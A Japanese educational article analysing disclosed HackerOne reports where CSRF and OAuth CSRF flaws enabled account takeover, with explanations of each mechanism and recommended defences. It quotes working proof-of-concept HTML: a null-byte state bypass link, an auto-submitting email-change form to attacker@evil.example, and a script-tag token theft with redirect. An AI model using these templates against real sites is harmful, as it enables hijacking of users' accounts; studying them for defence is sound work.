## HackerOne公開ATOレポート

本節では、HackerOneで公開されたCSRF（Cross-Site Request Forgery）／OAuth CSRFに起因するATO（Account Takeover、アカウント乗っ取り）レポートのうち、公開レベルの支持（upvote）が高く、かつ「なぜCSRFがATOにまで到達したか」という仕組みが典型的なものを3件取り上げる。いずれも既に公開・修正済みのレポートであり、対象組織への追試や再現は行わない。読者が学ぶべきは「個別のバグ」ではなく、CSRFがなぜアカウント乗っ取りという最悪級の影響に直結しやすいのかという構造である。

### なぜCSRF単体が「フルATO」に到達するのか

CSRFは本来、被害者に「意図しないリクエストを送らせる」だけの脆弱性であり、レスポンスを読み取ることはできない（Same-Origin Policyの制約により、クロスオリジンからのレスポンス本文の読み取りは阻止される）。しかし、以下の2種類のエンドポイントに対してCSRFが成立すると、レスポンスを読まなくても攻撃者はアカウントを完全に制御できるようになる。

1. **メールアドレス変更エンドポイント**: 被害者のメールアドレスを攻撃者が管理するアドレスに書き換えられれば、その後は正規のパスワードリセット機能を使うだけでアカウントの所有権を奪える。CSRFのレスポンスを読む必要がない点が重要で、「送信できるだけ」で完結する。
2. **OAuth／ソーシャルログイン連携エンドポイント**: 「このアカウントにGoogle/Facebook/Twitchなどの外部アカウントを紐付ける」機能に対してCSRFが成立すると、攻撃者は自分が完全にコントロールする外部アカウントを被害者のアカウントに紐付けることができる。その後は外部アカウント側でログインするだけで、被害者のアカウントに侵入できる。パスワードやメールアドレスを一切変更しないため、被害者は異変に気づきにくいという特徴もある。

この2パターンはいずれも「状態変更系（state-changing）のリクエストに対して、送信元の正当性を検証していない」という同じ欠陥に起因する。検証すべき代表的な仕組みは次の3つで、今回扱う事例はいずれかが欠落、または実装に不備があったケースである。

- CSRFトークン（推測不可能なワンタイム値をリクエストに含め、サーバー側で照合する）
- `Origin`/`Referer`ヘッダーの検証
- OAuthの`state`パラメータ（認可リクエストとコールバックを紐付け、CSRFを防ぐために標準仕様（RFC 6749）が定める値）

以下、3件を順に見ていく。

### 事例1: reddelexc/hackerone-reportsによるATO上位レポート集計（Rockstar Games / Logitech-Streamlabs 他）

`reddelexc/hackerone-reports`は、HackerOneで公開されているレポートをupvote数や賞金額で集計し、バグ種別・プログラム別のランキングとして`docs/tops_by_bug_type/`配下にまとめているリポジトリである。CSRFに起因するATO事例だけを集計した`TOPACCOUNTTAKEOVER.md`から、CSRF関連の上位項目を抜き出すと以下の通りである（2024年前後の集計時点のスナップショットであり、upvote数・賞金額はその後変動している可能性がある）。

| 順位 | タイトル | 対象プログラム | upvote | 賞金 |
|---|---|---|---|---|
| 22 | Account Takeover using Linked Accounts due to lack of CSRF protection | Rockstar Games | 238 | 非公開（bounty支給あり） |
| 58 | One Click Account takeover using Ouath CSRF bypass by adding Null byte %00 in state parameter on www.streamlabs.com | Logitech | 99 | $200 |
| 90 | [CRITICAL] Full account takeover using CSRF | Bumble | 62 | bounty支給あり |
| 212 | CSRF to account takeover in https://█████/ | U.S. Dept Of Defense | 8 | $0（VDPのため） |

> 出典: reddelexc/hackerone-reports — TOPACCOUNTTAKEOVER.md — https://github.com/reddelexc/hackerone-reports/blob/master/docs/tops_by_bug_type/TOPACCOUNTTAKEOVER.md

このリストで特に学びの多い2件を掘り下げる。

#### Rockstar Games: 「連携アカウント」機能でのCSRF（238 upvotes）

Rockstar Gamesの「Social Club」（ゲームアカウント基盤）には、Steam・Epic Games・PlayStation Networkなどの外部プラットフォームアカウントを紐付ける機能がある。このレポートのタイトルが示す通り、脆弱性の核心は「Linked Accounts（連携アカウント）機能にCSRF保護が存在しない」ことであり、攻撃者は被害者に悪意あるページを閲覧させるだけで、自分の外部プラットフォームアカウントを被害者のSocial Clubアカウントに紐付けることができた。紐付け後は、攻撃者は自分の外部アカウントでログインするだけで被害者のアカウント（保有ゲーム、課金情報、フレンドリストなど）に到達できる。238 upvotesという支持数は、HackerOneコミュニティ内でも「CSRF単体でここまで到達するのか」という教材的価値の高さを反映していると考えられる。

このケースが示す原則は、「メールアドレス変更」だけでなく「アカウント連携」もCSRF保護の対象に含めるべきだという点である。開発者はログイン画面やパスワード変更画面のCSRF対策には注意を払っても、「連携」のような一見補助的な機能のCSRF対策を見落としがちである。しかし連携機能はログインパスと機能的に等価であり、保護レベルもログイン・パスワード変更と同格に扱う必要がある。

#### Logitech（Streamlabs）: OAuthのstateパラメータへのNull Byteインジェクション（99 upvotes, $200）

このレポート（#1046630）は、別の先行レポート（#1039749）に対する「バイパス」として提出された点が興味深い。つまり一度修正が入った後、その修正が不完全であったために再度攻撃が成立したケースである。実際の再現手順を原文から引用する。

```
1. Login to attacker's account and go to settings --> account settings.
2. Intercept the request in burp suite and click on merge twitch account.
3. Allow twitch access and once you see a get request in burp with host
   streamlabs.com and parameters code, scope and state then generate CSRF PoC
   from burp suite and drop that request.
4. Add null byte character in state parameter and host that CSRF PoC on
   attacker.com and ask victim to visit attacker.com
5. Once victim visits attacker.com attacker's twitch account will be
   connected to victim's account.
6. Now attacker will login to victim's streamlabs.com using his twitch account.
```

PoCのHTMLは以下の通りである。

```html
<html>
<head>
<style>
h1 {text-align: center;}
p {text-align: center;}
div {text-align: center;}
</style>
</head>
<body>
<h1>One Click Account Takeover PoC By C0nquer0rs</h1>
<p>Click the button to go to the Streamlabs and check you're account settings.</p>
<h1><button onclick="document.location='https://streamlabs.com/auth?code=e5p67p5r6vjizvpl2fj756625zv8ra&scope=user_read&state=b33a75be1737978b4c5ea22f7bf53078c86256db-merge%00'">Click Me</button><h1>
</body>
</html>
```

**なぜNull Byte（`%00`）を末尾に付けるだけでstate検証を回避できたのか。** OAuthの`state`パラメータは、サーバーが認可リクエスト発行時に生成しセッションに紐付けた値と、コールバックで返ってきた値が完全一致するかどうかを検証することでCSRFを防ぐ仕組みである。ところがこのアプリケーションのサーバー側実装は、文字列比較の際にNull Byte以降を切り捨てる、あるいはNull Byteを含む文字列を「値なし」や「別処理」として扱うパーサ/言語ランタイムの挙動に引きずられていたと推測される（C言語の文字列がNull終端であることに由来する歴史的なパーサの脆弱性パターンであり、PHPやNode.jsのネイティブ拡張、あるいは正規表現ベースのバリデーションが`\0`を「文字列の終端」として扱ってしまうケースで頻出する）。攻撃者は自分の正規のOAuthフローで発行された有効な`state`値（`b33a75be...-merge`）の末尾に`%00`を付加して被害者に踏ませても、サーバー側の検証ロジックが実質的に元の`state`値と「同じもの」とみなしてしまい、CSRF対策としての一意性チェックが無効化された。結果として、攻撃者が自分のセッションで取得した認可コード（`code`パラメータ）を被害者のブラウザ経由でコールバックエンドポイントに送り込むことに成功し、被害者のStreamlabsアカウントに攻撃者のTwitchアカウントが連携された。

この事例からの教訓は次の2点である。

- OAuthの`state`検証は「文字列が存在するか」ではなく「完全一致（バイト単位）」で行う必要があり、正規化・トリミング・Null終端の扱いなど、比較対象の文字列処理系の癖に脆弱性が潜みやすい。
- 一度パッチされた脆弱性（#1039749）に対する「バイパス」が別途評価・報奨されている通り、CSRF対策の修正は「元の攻撃コードが通らなくなったか」ではなく「検証ロジックが仕様通り厳密に動作しているか」まで踏み込んでレビューする必要がある。

> 出典: reddelexc/hackerone-reports — TOPACCOUNTTAKEOVER.md — https://github.com/reddelexc/hackerone-reports/blob/master/docs/tops_by_bug_type/TOPACCOUNTTAKEOVER.md
> 出典: Logitech disclosed on HackerOne — Report #1046630 — https://hackerone.com/reports/1046630

### 事例2: Report #1018270 — メールアドレス変更にCSRF対策が皆無だったケース（U.S. Dept Of Defense）

このレポートは米国防総省（DoD）の脆弱性開示プログラム（VDP、Vulnerability Disclosure Program。バグ報奨金ではなく、脆弱性報告の受付・修正のみを目的とした無報酬プログラム）に対するもので、2020年10月25日に提出、同年11月9日に公開（disclose）された。対象ドメインはVDPの性質上、公開情報でも伏字（`█`）で伏せられている。severityは`critical`。

原文（要約）は次の通りである。

```
Summary:
There is no protection against CSRF in changing email which lead to
CSRF to account takeover on https://██████/.

Step-by-step Reproduction Instructions
1. Login as victim and check your infos in the account details
2. Open the CSRF malicious file which I have attached (csrf_POC.html)
3. Now the email is different (you can also change your name and
   other fields as well)
4. Now you can simply takeover the account
5. All you have to do is click on reset password on main page and
   enter the email you used to trick the victim and you will get
   instructions to reset the password. And you can successfully
   takeover the account
```

この報告が典型例として重要なのは、**攻撃の各ステップに何も高度な技術が使われていない**という点である。使われている武器は「CSRFトークンも`Origin`検証も存在しないPOSTエンドポイントに対する、ただの自動送信フォーム」だけであり、以下のような最小限のPoC HTMLで再現できる（原文には具体的なHTMLは添付ファイルとしてのみ存在し、本文中には記載されていないため、一般的なメールアドレス変更CSRF PoCの定型形で補足する）。

```html
<!-- （以下は未取得資料の補足として一般知識に基づく解説です。原文の添付ファイル csrf_POC.html
     の実物は本文中に含まれていなかったため、典型的な構成で示す） -->
<form id="f" method="POST" action="https://victim-site.example/account/change-email">
  <input type="hidden" name="email" value="attacker@evil.example">
</form>
<script>document.getElementById('f').submit();</script>
```

**なぜ「メール変更」だけでフルATOに到達するのか、仕組みを整理する。** パスワードリセット機能は一般に「登録済みメールアドレス宛てにリセットリンクを送る」という設計になっている。この設計自体は正しいセキュリティプラクティスだが、前提として「そのメールアドレスの登録者が本人である」ことが暗黙の信頼基盤になっている。CSRFによってメールアドレスというレコードそのものが書き換えられてしまうと、この信頼基盤が崩れ、パスワードリセット機能が「本人確認の手段」から「攻撃者にアカウントを明け渡す手段」に反転する。つまりCSRF対策の欠如は、メールアドレス変更エンドポイント単体の弱点にとどまらず、パスワードリセットという別の正規機能の安全性の前提を破壊する点で、単純な「情報改ざん」以上の連鎖的な影響（chained impact）を持つ。

このレポートに対する提案された修正（Suggested Mitigation）も原文に明記されている。

```
Use captchas and CSRF-tokens for be sure that the victim is changing
the datas knowing that.
```

CAPTCHAはユーザーの明示的な操作を強制する対策ではあるが、CSRF対策の本筋はあくまで「リクエストが正規のページ由来かどうかをサーバー側で検証すること」であり、実務的には次のいずれか（できれば複数）を組み合わせるべきである。

- 同期トークンパターン（Synchronizer Token Pattern）: セッションごとに発行したCSRFトークンをフォームに埋め込み、サーバー側で照合する。
- `SameSite=Lax`または`Strict`属性をセッションCookieに付与し、クロスサイトの自動送信リクエストにそもそもCookieが同送されないようにする。
- メールアドレスなどの重要情報を変更する操作には、変更前に現在のパスワードの再入力を要求する（ステップアップ認証）。これはCSRFトークンが万一漏洩・欠落していても、被害者のブラウザが自動的に持っている情報（Cookie）だけでは完結しない追加の摩擦を作る、多層防御の一種である。

> 出典: U.S. Dept Of Defense disclosed on HackerOne — Report #1018270, "CSRF to account takeover" — https://hackerone.com/reports/1018270

### 事例3: Report #127703 — chrome-service-worker.jsへのCSRFトークン漏洩からのOAuth連携CSRF（Bumble/Badoo）

このレポートは2016年4月2日にBumble（当時のBadoo）へ提出され、同年4月12日に公開・報奨されたもので、severityは`critical`。タイトル通り「CSRFによるフルアカウント乗っ取り」だが、単純にCSRFトークンが存在しなかったわけではない点が他の2事例と異なり、教育的価値が高い。**このケースではCSRF対策となる`rt`パラメータ（stateトークンに相当する値）自体は存在していた。しかし、その値がまったく無関係な場所から漏洩していた**ために対策が無力化された。

原文の技術詳細を引用する。

```
When a user tries to link a gmail account with his account, after he
authorizes badoo to use his gmail account he will be redirected to
`https://eu1.badoo.com/google/verify.phtml?rt=<State_param_value>&code=<Code_returned_from_google>`,
the only thing that protects from CSRF is the `rt` parameter which is
unique for each user/session. I have noticed that the `rt` parameter
is returned on almost all json responses so I tried to find a link
that leaks it. After digging for a while, I have found this link
https://eu1.badoo.com/worker-scope/chrome-service-worker.js, and I
was surprised that it contains the `rt` parameter value!!
```

漏洩箇所となったService Worker用スクリプトの中身（該当変数のみ抜粋）は次の通りである。

```javascript
var url_stats = 'https://eu1.badoo.com/chrome-push-stats?ws=1&rt=<rt_param_value>';
```

そしてこの漏洩値を利用した実際のPoCコードが以下である。

```html
<html>
<head>
<title>Badoo account take over</title>
<script src=https://eu1.badoo.com/worker-scope/chrome-service-worker.js?ws=1></script>
</head>
<body>
<script>
function getCSRFcode(str) {
    return str.split('=')[2];
}
window.onload = function(){
var csrf_code = getCSRFcode(url_stats);
csrf_url = 'https://eu1.badoo.com/google/verify.phtml?code=4/nprfspM3yfn2SFUBear08KQaXo609JkArgoju1gZ6Pc&authuser=3&session_state=7cb85df679219ce71044666c7be3e037ff54b560..a810&prompt=none&rt='+ csrf_code;
window.location = csrf_url;
};
</script>
</body>
</html>
```

**なぜこのPoCが機能したのか、仕組みを段階的に説明する。**

1. **`<script src=...>`によるクロスオリジン読み込みはSame-Origin Policyの制約を受けない。** SOPが制限するのは「レスポンスのJavaScriptからの読み取り」であるが、`<script>`タグでの読み込みは「スクリプトとして実行すること」自体が目的であり、ブラウザはこれをブロックしない。しかもCookieはリクエスト先ドメイン（`eu1.badoo.com`）宛てに自動送信されるため、被害者が既にBadooにログイン済みであれば、被害者自身のセッションでこの`chrome-service-worker.js`が取得される。
2. **このJSファイルはグローバルスコープで`var url_stats = '...rt=<被害者本人のrt値>'`という文を実行する。** これは通常のJSONのような「データ」ではなく実行可能なJavaScriptコードであるため、攻撃者のページから`<script src>`で読み込むだけで、そのグローバル変数`url_stats`が攻撃者のページの実行コンテキストにそのまま生成される。これは典型的な「JSONP的な情報漏洩（JavaScript実行可能なレスポンスに機密値が平文で埋め込まれ、クロスオリジンから読み取り可能になってしまう）」のパターンである。JSON形式のAPIレスポンスであれば`<script src>`で読み込んでもオブジェクトリテラルとして評価されるだけで変数に代入されず窃取できないが、この`chrome-service-worker.js`は「代入文を含むJavaScriptそのもの」だったために、値がそのままグローバル変数として攻撃者のスコープに漏れ出した。
3. 攻撃者はこうして入手した被害者の`rt`値を、**攻撃者自身が保有するGmailアカウントの認可コード（`code`パラメータ、攻撃者が自分のGoogleアカウントで認可を得て取得した正規の値）**と組み合わせて、`/google/verify.phtml`エンドポイントへのリクエストを構築する。この`rt`パラメータは「誰の」CSRFトークンかをサーバーが検証する仕組みではなく、単に「有効な値かどうか」だけを見ていたと考えられ、被害者のセッションCookie＋被害者自身の`rt`値＋攻撃者のGoogle認可コードという組み合わせでリクエストが成立してしまった。
4. 被害者がこのPoCページを開いた瞬間（`window.onload`）に自動的にリダイレクトが発生し、被害者のBadooアカウントに攻撃者のGmailアカウントが連携される。以後、攻撃者は自分のGmailアカウントでソーシャルログインするだけで被害者のアカウントに侵入できる。

このケースの本質的な教訓は、「CSRFトークンを実装している」ことと「CSRF対策が機能している」ことは同義ではないという点である。トークンの生成・検証ロジック自体が正しくても、**トークンの値がアプリケーションの別の経路（この場合はService Worker用の統計送信スクリプト）から漏洩していれば、対策は全体として無効化される**。これは横断的関心事（cross-cutting concern）としてのセキュリティレビューの重要性を示す例で、「認可・連携機能」のセキュリティレビューだけでなく、「一見無関係なJSファイルやAPIレスポンスに機密トークンが平文で混入していないか」という観点の監査（機密値のgrep監査、レスポンスボディ全体の棚卸し）が必要であることを示している。

> 出典: Bumble (Badoo) disclosed on HackerOne — Report #127703, "[CRITICAL] Full account takeover using CSRF" — https://hackerone.com/reports/127703

### 3事例の比較と実務への示唆

| 観点 | Rockstar Games (#463330) | DoD (#1018270) | Bumble/Badoo (#127703) |
|---|---|---|---|
| 対策の状態 | CSRF対策そのものが存在しない | CSRF対策そのものが存在しない | `state`相当のトークン(`rt`)は実装されていたが漏洩 |
| 悪用された機能 | 外部アカウント連携 | メールアドレス変更 | Google/Gmailアカウント連携（OAuth） |
| ATOへの到達経路 | 連携アカウントでのログイン | パスワードリセット機能の悪用 | 連携アカウントでのログイン |
| 教訓 | 「連携」機能もログイン相当の保護レベルが必要 | 情報変更系エンドポイント全てにCSRF対策が要る | トークンの実装だけでなく漏洩経路の監査が必要 |

3件に共通するのは、**攻撃者が読み取り不能なはずのレスポンスを一切必要としなかった**という点である。CSRFは「盲目的な書き込み攻撃」であり、書き込み先が「メールアドレス」または「外部ログイン連携」という、その後の操作でアカウントの完全制御に直結するフィールドである場合、CSRFはXSSやSQLインジェクションに匹敵する重大度（Critical）に格上げされる。防御側は、CSRFトークンや`SameSite`属性の実装状況を機能ごとに棚卸しする際、「見た目の重要度が低そうな連携・設定変更系エンドポイント」を対象から漏らさないことが最も重要な実務上のチェックポイントである。
